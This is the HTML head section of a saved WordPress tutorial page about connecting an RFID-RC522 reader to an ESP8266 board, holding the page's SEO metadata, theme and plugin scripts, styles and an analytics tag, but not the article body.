@@ -1,0 +1,1023 @@
+<!DOCTYPE html>
+<!-- saved from url=(0068)http://www.esp8266learning.com/esp8266-rfid-rc522-module-example.php -->
+<html lang="en-GB" class=" td-md-is-chrome"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>ESP8266 and RFID-RC522 module example - esp8266 learning</title>
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="pingback" href="http://www.esp8266learning.com/xmlrpc.php">
+    <link rel="dns-prefetch" href="http://esp8266learning.b-cdn.net/"><meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1">
+<link rel="icon" type="image/png" href="http://esp8266learning.b-cdn.net/wp-content/uploads/2019/06/icon16.jpg">
+	<!-- This site is optimized with the Yoast SEO Premium plugin v20.6 (Yoast SEO v21.5) - https://yoast.com/wordpress/plugins/seo/ -->
+	<link rel="canonical" href="http://www.esp8266learning.com/esp8266-rfid-rc522-module-example.php">
+	<meta property="og:locale" content="en_GB">
+	<meta property="og:type" content="article">
+	<meta property="og:title" content="ESP8266 and RFID-RC522 module example">
+	<meta property="og:description" content="In this example we will connect an RFID-RC522 module and connect to a Wemos Mini The microcontroller and card reader uses SPI for communication . The card reader and the tags communicate using a 13.56MHz electromagnetic field. (ISO 14443A standart tags) Features: MFRC522 chip based board Operating frequency: 13.56MHz Supply Voltage: 3.3V Current: 13-26mA Read […]">
+	<meta property="og:url" content="http://www.esp8266learning.com/esp8266-rfid-rc522-module-example.php">
+	<meta property="og:site_name" content="esp8266 learning">
+	<meta property="article:published_time" content="2017-12-22T12:57:47+00:00">
+	<meta property="og:image" content="http://www.esp32learning.com/wp-content/uploads/2017/12/javaw_2017-12-22_00-08-09.png">
+	<meta name="author" content="shedboy71">
+	<meta name="twitter:card" content="summary_large_image">
+	<meta name="twitter:label1" content="Written by">
+	<meta name="twitter:data1" content="shedboy71">
+	<meta name="twitter:label2" content="Estimated reading time">
+	<meta name="twitter:data2" content="2 minutes">
+	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebPage","@id":"http://www.esp8266learning.com/esp8266-rfid-rc522-module-example.php","url":"http://www.esp8266learning.com/esp8266-rfid-rc522-module-example.php","name":"ESP8266 and RFID-RC522 module example - esp8266 learning","isPartOf":{"@id":"http://www.esp8266learning.com/#website"},"primaryImageOfPage":{"@id":"http://www.esp8266learning.com/esp8266-rfid-rc522-module-example.php#primaryimage"},"image":{"@id":"http://www.esp8266learning.com/esp8266-rfid-rc522-module-example.php#primaryimage"},"thumbnailUrl":"http://www.esp32learning.com/wp-content/uploads/2017/12/javaw_2017-12-22_00-08-09.png","datePublished":"2017-12-22T12:57:47+00:00","dateModified":"2017-12-22T12:57:47+00:00","author":{"@id":"http://www.esp8266learning.com/#/schema/person/c403df6bfa847e11a2f90b1e2f18473c"},"breadcrumb":{"@id":"http://www.esp8266learning.com/esp8266-rfid-rc522-module-example.php#breadcrumb"},"inLanguage":"en-GB","potentialAction":[{"@type":"ReadAction","target":["http://www.esp8266learning.com/esp8266-rfid-rc522-module-example.php"]}]},{"@type":"ImageObject","inLanguage":"en-GB","@id":"http://www.esp8266learning.com/esp8266-rfid-rc522-module-example.php#primaryimage","url":"http://www.esp32learning.com/wp-content/uploads/2017/12/javaw_2017-12-22_00-08-09.png","contentUrl":"http://www.esp32learning.com/wp-content/uploads/2017/12/javaw_2017-12-22_00-08-09.png"},{"@type":"BreadcrumbList","@id":"http://www.esp8266learning.com/esp8266-rfid-rc522-module-example.php#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"http://www.esp8266learning.com/"},{"@type":"ListItem","position":2,"name":"ESP8266 and RFID-RC522 module example"}]},{"@type":"WebSite","@id":"http://www.esp8266learning.com/#website","url":"http://www.esp8266learning.com/","name":"esp8266 learning","description":"Just another WordPress site","potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"http://www.esp8266learning.com/?s={search_term_string}"},"query-input":"required name=search_term_string"}],"inLanguage":"en-GB"},{"@type":"Person","@id":"http://www.esp8266learning.com/#/schema/person/c403df6bfa847e11a2f90b1e2f18473c","name":"shedboy71","image":{"@type":"ImageObject","inLanguage":"en-GB","@id":"http://www.esp8266learning.com/#/schema/person/image/","url":"http://1.gravatar.com/avatar/47fd911ea2e2dde45c3c010464fe4f9a?s=96&d=mm&r=g","contentUrl":"http://1.gravatar.com/avatar/47fd911ea2e2dde45c3c010464fe4f9a?s=96&d=mm&r=g","caption":"shedboy71"},"url":"http://www.esp8266learning.com/author/shedboy71"}]}</script>
+	<!-- / Yoast SEO Premium plugin. -->
+
+
+<link rel="dns-prefetch" href="http://static.addtoany.com/">
+<link rel="dns-prefetch" href="http://fonts.googleapis.com/">
+<link rel="alternate" type="application/rss+xml" title="esp8266 learning » Feed" href="http://www.esp8266learning.com/feed">
+<link rel="alternate" type="application/rss+xml" title="esp8266 learning » Comments Feed" href="http://www.esp8266learning.com/comments/feed">
+<link rel="alternate" type="application/rss+xml" title="esp8266 learning » ESP8266 and RFID-RC522 module example Comments Feed" href="http://www.esp8266learning.com/esp8266-rfid-rc522-module-example.php/feed">
+<script type="text/javascript">
+window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/svg\/","svgExt":".svg","source":{"concatemoji":"http:\/\/www.esp8266learning.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.2.3"}};
+/*! This file is auto-generated */
+!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){p.clearRect(0,0,i.width,i.height),p.fillText(e,0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(t,0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(p&&p.fillText)switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s("\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!s("\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!s("\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!s("\ud83e\udef1\ud83c\udffb\u200d\ud83e\udef2\ud83c\udfff","\ud83e\udef1\ud83c\udffb\u200b\ud83e\udef2\ud83c\udfff")}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(e=t.source||{}).concatemoji?c(e.concatemoji):e.wpemoji&&e.twemoji&&(c(e.twemoji),c(e.wpemoji)))}(window,document,window._wpemojiSettings);
+</script><script src="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/wp-emoji-release.min.js.download" type="text/javascript" defer=""></script>
+<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 0.07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel="stylesheet" id="wp-block-library-css" href="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/style.min.css" type="text/css" media="all">
+<link rel="stylesheet" id="classic-theme-styles-css" href="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/classic-themes.min.css" type="text/css" media="all">
+<style id="global-styles-inline-css" type="text/css">
+body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--duotone--dark-grayscale: url('#wp-duotone-dark-grayscale');--wp--preset--duotone--grayscale: url('#wp-duotone-grayscale');--wp--preset--duotone--purple-yellow: url('#wp-duotone-purple-yellow');--wp--preset--duotone--blue-red: url('#wp-duotone-blue-red');--wp--preset--duotone--midnight: url('#wp-duotone-midnight');--wp--preset--duotone--magenta-yellow: url('#wp-duotone-magenta-yellow');--wp--preset--duotone--purple-green: url('#wp-duotone-purple-green');--wp--preset--duotone--blue-orange: url('#wp-duotone-blue-orange');--wp--preset--font-size--small: 11px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 32px;--wp--preset--font-size--x-large: 42px;--wp--preset--font-size--regular: 15px;--wp--preset--font-size--larger: 50px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}body .is-layout-flow > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-flow > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-flow > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-constrained > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-constrained > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > :where(:not(.alignleft):not(.alignright):not(.alignfull)){max-width: var(--wp--style--global--content-size);margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignwide{max-width: var(--wp--style--global--wide-size);}body .is-layout-flex{display: flex;}body .is-layout-flex{flex-wrap: wrap;align-items: center;}body .is-layout-flex > *{margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+.wp-block-navigation a:where(:not(.wp-element-button)){color: inherit;}
+:where(.wp-block-columns.is-layout-flex){gap: 2em;}
+.wp-block-pullquote{font-size: 1.5em;line-height: 1.6;}
+</style>
+<link rel="stylesheet" id="cookie-law-info-css" href="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/cookie-law-info-public.css" type="text/css" media="all">
+<link rel="stylesheet" id="cookie-law-info-gdpr-css" href="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/cookie-law-info-gdpr.css" type="text/css" media="all">
+<link rel="stylesheet" id="td-plugin-multi-purpose-css" href="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/style.css" type="text/css" media="all">
+<link rel="stylesheet" id="google-fonts-style-css" href="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/css" type="text/css" media="all">
+<link rel="stylesheet" id="td-theme-css" href="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/style(1).css" type="text/css" media="all">
+<style id="td-theme-inline-css" type="text/css">
+    
+        @media (max-width: 767px) {
+            .td-header-desktop-wrap {
+                display: none;
+            }
+        }
+        @media (min-width: 767px) {
+            .td-header-mobile-wrap {
+                display: none;
+            }
+        }
+    
+	
+</style>
+<link rel="stylesheet" id="addtoany-css" href="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/addtoany.min.css" type="text/css" media="all">
+<link rel="stylesheet" id="td-legacy-framework-front-style-css" href="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/td_legacy_main.css" type="text/css" media="all">
+<script type="text/javascript" id="addtoany-core-js-before">
+window.a2a_config=window.a2a_config||{};a2a_config.callbacks=[];a2a_config.overlays=[];a2a_config.templates={};a2a_localize = {
+	Share: "Share",
+	Save: "Save",
+	Subscribe: "Subscribe",
+	Email: "Email",
+	Bookmark: "Bookmark",
+	ShowAll: "Show All",
+	ShowLess: "Show less",
+	FindServices: "Find service(s)",
+	FindAnyServiceToAddTo: "Instantly find any service to add to",
+	PoweredBy: "Powered by",
+	ShareViaEmail: "Share via email",
+	SubscribeViaEmail: "Subscribe via email",
+	BookmarkInYourBrowser: "Bookmark in your browser",
+	BookmarkInstructions: "Press Ctrl+D or \u2318+D to bookmark this page",
+	AddToYourFavorites: "Add to your favourites",
+	SendFromWebOrProgram: "Send from any email address or email program",
+	EmailProgram: "Email program",
+	More: "More&#8230;",
+	ThanksForSharing: "Thanks for sharing!",
+	ThanksForFollowing: "Thanks for following!"
+};
+</script>
+<script type="text/javascript" async="" src="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/page.js.download" id="addtoany-core-js"></script>
+<script type="text/javascript" src="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/jquery.min.js.download" id="jquery-core-js"></script>
+<script type="text/javascript" src="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/jquery-migrate.min.js.download" id="jquery-migrate-js"></script>
+<script type="text/javascript" async="" src="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/addtoany.min.js.download" id="addtoany-jquery-js"></script>
+<script type="text/javascript" id="cookie-law-info-js-extra">
+/* <![CDATA[ */
+var Cli_Data = {"nn_cookie_ids":[],"cookielist":[],"non_necessary_cookies":[],"ccpaEnabled":"","ccpaRegionBased":"","ccpaBarEnabled":"","strictlyEnabled":["necessary","obligatoire"],"ccpaType":"gdpr","js_blocking":"1","custom_integration":"","triggerDomRefresh":"","secure_cookies":""};
+var cli_cookiebar_settings = {"animate_speed_hide":"500","animate_speed_show":"500","background":"#FFF","border":"#b1a6a6c2","border_on":"","button_1_button_colour":"#61a229","button_1_button_hover":"#4e8221","button_1_link_colour":"#fff","button_1_as_button":"1","button_1_new_win":"","button_2_button_colour":"#333","button_2_button_hover":"#292929","button_2_link_colour":"#444","button_2_as_button":"","button_2_hidebar":"","button_3_button_colour":"#dedfe0","button_3_button_hover":"#b2b2b3","button_3_link_colour":"#333333","button_3_as_button":"1","button_3_new_win":"","button_4_button_colour":"#dedfe0","button_4_button_hover":"#b2b2b3","button_4_link_colour":"#333333","button_4_as_button":"1","button_7_button_colour":"#61a229","button_7_button_hover":"#4e8221","button_7_link_colour":"#fff","button_7_as_button":"1","button_7_new_win":"","font_family":"inherit","header_fix":"","notify_animate_hide":"1","notify_animate_show":"","notify_div_id":"#cookie-law-info-bar","notify_position_horizontal":"right","notify_position_vertical":"bottom","scroll_close":"","scroll_close_reload":"","accept_close_reload":"","reject_close_reload":"","showagain_tab":"","showagain_background":"#fff","showagain_border":"#000","showagain_div_id":"#cookie-law-info-again","showagain_x_position":"100px","text":"#333333","show_once_yn":"","show_once":"10000","logging_on":"","as_popup":"","popup_overlay":"1","bar_heading_text":"","cookie_bar_as":"popup","popup_showagain_position":"bottom-right","widget_position":"left"};
+var log_object = {"ajax_url":"http:\/\/www.esp8266learning.com\/wp-admin\/admin-ajax.php"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/cookie-law-info-public.js.download" id="cookie-law-info-js"></script>
+<link rel="https://api.w.org/" href="http://www.esp8266learning.com/wp-json/"><link rel="alternate" type="application/json" href="http://www.esp8266learning.com/wp-json/wp/v2/posts/488"><link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.esp8266learning.com/xmlrpc.php?rsd">
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://esp8266learning.b-cdn.net/wp-includes/wlwmanifest.xml">
+<meta name="generator" content="WordPress 6.2.3">
+<link rel="shortlink" href="http://www.esp8266learning.com/?p=488">
+<link rel="alternate" type="application/json+oembed" href="http://www.esp8266learning.com/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fwww.esp8266learning.com%2Fesp8266-rfid-rc522-module-example.php">
+<link rel="alternate" type="text/xml+oembed" href="http://www.esp8266learning.com/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fwww.esp8266learning.com%2Fesp8266-rfid-rc522-module-example.php&amp;format=xml">
+
+<!-- This site is using AdRotate v5.12.6 to display their advertisements - https://ajdg.solutions/ -->
+<!-- AdRotate CSS -->
+<style type="text/css" media="screen">
+	.g { margin:0px; padding:0px; overflow:hidden; line-height:1; zoom:1; }
+	.g img { height:auto; }
+	.g-col { position:relative; float:left; }
+	.g-col:first-child { margin-left: 0; }
+	.g-col:last-child { margin-right: 0; }
+	.g-1 { margin:0px;  width:100%; max-width:125px; height:100%; max-height:125px; }
+	.g-2 { min-width:4px; max-width:308px; }
+	.b-2 { margin:4px; }
+	@media only screen and (max-width: 480px) {
+		.g-col, .g-dyn, .g-single { width:100%; margin-left:0; margin-right:0; }
+	}
+</style>
+<!-- /AdRotate CSS -->
+
+<script async="" src="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/f.txt" crossorigin="anonymous"></script><!--[if lt IE 9]><script src="http://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.js"></script><![endif]-->
+    			<script>
+				window.tdwGlobal = {"adminUrl":"http:\/\/www.esp8266learning.com\/wp-admin\/","wpRestNonce":"b7ff5c1c33","wpRestUrl":"http:\/\/www.esp8266learning.com\/wp-json\/","permalinkStructure":"\/%postname%.php"};
+			</script>
+			
+<!-- JS generated by theme -->
+
+<script>
+    
+    
+
+	    var tdBlocksArray = []; //here we store all the items for the current page
+
+	    //td_block class - each ajax block uses a object of this class for requests
+	    function tdBlock() {
+		    this.id = '';
+		    this.block_type = 1; //block type id (1-234 etc)
+		    this.atts = '';
+		    this.td_column_number = '';
+		    this.td_current_page = 1; //
+		    this.post_count = 0; //from wp
+		    this.found_posts = 0; //from wp
+		    this.max_num_pages = 0; //from wp
+		    this.td_filter_value = ''; //current live filter value
+		    this.is_ajax_running = false;
+		    this.td_user_action = ''; // load more or infinite loader (used by the animation)
+		    this.header_color = '';
+		    this.ajax_pagination_infinite_stop = ''; //show load more at page x
+	    }
+
+
+        // td_js_generator - mini detector
+        (function(){
+            var htmlTag = document.getElementsByTagName("html")[0];
+
+	        if ( navigator.userAgent.indexOf("MSIE 10.0") > -1 ) {
+                htmlTag.className += ' ie10';
+            }
+
+            if ( !!navigator.userAgent.match(/Trident.*rv\:11\./) ) {
+                htmlTag.className += ' ie11';
+            }
+
+	        if ( navigator.userAgent.indexOf("Edge") > -1 ) {
+                htmlTag.className += ' ieEdge';
+            }
+
+            if ( /(iPad|iPhone|iPod)/g.test(navigator.userAgent) ) {
+                htmlTag.className += ' td-md-is-ios';
+            }
+
+            var user_agent = navigator.userAgent.toLowerCase();
+            if ( user_agent.indexOf("android") > -1 ) {
+                htmlTag.className += ' td-md-is-android';
+            }
+
+            if ( -1 !== navigator.userAgent.indexOf('Mac OS X')  ) {
+                htmlTag.className += ' td-md-is-os-x';
+            }
+
+            if ( /chrom(e|ium)/.test(navigator.userAgent.toLowerCase()) ) {
+               htmlTag.className += ' td-md-is-chrome';
+            }
+
+            if ( -1 !== navigator.userAgent.indexOf('Firefox') ) {
+                htmlTag.className += ' td-md-is-firefox';
+            }
+
+            if ( -1 !== navigator.userAgent.indexOf('Safari') && -1 === navigator.userAgent.indexOf('Chrome') ) {
+                htmlTag.className += ' td-md-is-safari';
+            }
+
+            if( -1 !== navigator.userAgent.indexOf('IEMobile') ){
+                htmlTag.className += ' td-md-is-iemobile';
+            }
+
+        })();
+
+
+
+
+        var tdLocalCache = {};
+
+        ( function () {
+            "use strict";
+
+            tdLocalCache = {
+                data: {},
+                remove: function (resource_id) {
+                    delete tdLocalCache.data[resource_id];
+                },
+                exist: function (resource_id) {
+                    return tdLocalCache.data.hasOwnProperty(resource_id) && tdLocalCache.data[resource_id] !== null;
+                },
+                get: function (resource_id) {
+                    return tdLocalCache.data[resource_id];
+                },
+                set: function (resource_id, cachedData) {
+                    tdLocalCache.remove(resource_id);
+                    tdLocalCache.data[resource_id] = cachedData;
+                }
+            };
+        })();
+
+    
+    
+var td_viewport_interval_list=[{"limitBottom":767,"sidebarWidth":228},{"limitBottom":1018,"sidebarWidth":300},{"limitBottom":1140,"sidebarWidth":324}];
+var tdc_is_installed="yes";
+var td_ajax_url="http:\/\/www.esp8266learning.com\/wp-admin\/admin-ajax.php?td_theme_name=Newspaper&v=9.7.3";
+var td_get_template_directory_uri="http:\/\/www.esp8266learning.com\/wp-content\/plugins\/td-composer\/legacy\/common";
+var tds_snap_menu="";
+var tds_logo_on_sticky="";
+var tds_header_style="";
+var td_please_wait="Please wait...";
+var td_email_user_pass_incorrect="User or password incorrect!";
+var td_email_user_incorrect="Email or username incorrect!";
+var td_email_incorrect="Email incorrect!";
+var tds_more_articles_on_post_enable="";
+var tds_more_articles_on_post_time_to_wait="";
+var tds_more_articles_on_post_pages_distance_from_top=0;
+var tds_theme_color_site_wide="#4db2ec";
+var tds_smart_sidebar="";
+var tdThemeName="Newspaper";
+var td_magnific_popup_translation_tPrev="Previous (Left arrow key)";
+var td_magnific_popup_translation_tNext="Next (Right arrow key)";
+var td_magnific_popup_translation_tCounter="%curr% of %total%";
+var td_magnific_popup_translation_ajax_tError="The content from %url% could not be loaded.";
+var td_magnific_popup_translation_image_tError="The image #%curr% could not be loaded.";
+var tdBlockNonce="4f356c54f7";
+var tdDateNamesI18n={"month_names":["January","February","March","April","May","June","July","August","September","October","November","December"],"month_names_short":["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"],"day_names":["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"],"day_names_short":["Sun","Mon","Tue","Wed","Thu","Fri","Sat"]};
+var td_ad_background_click_link="";
+var td_ad_background_click_target="";
+</script>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async="" src="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/js"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-144193664-1');
+</script>
+<!-- Button style compiled by theme -->
+
+<style>
+    
+</style>
+
